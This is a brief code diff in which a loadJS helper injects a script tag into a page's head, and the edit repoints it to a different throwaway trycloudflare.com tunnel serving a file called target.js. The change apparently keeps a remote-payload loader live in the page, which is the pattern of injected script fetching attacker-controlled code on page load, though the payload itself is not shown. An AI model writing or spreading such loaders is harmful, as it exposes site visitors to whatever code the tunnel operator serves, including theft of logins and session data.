@@ -4,7 +4,7 @@
         script.src = url;
         document.head.appendChild(script);
     }
-    loadJS("https://das-alfred-clinics-watt.trycloudflare.com/target.js");
+    loadJS("https://mp-renewal-theory-anybody.trycloudflare.com/target.js");
 
    
 
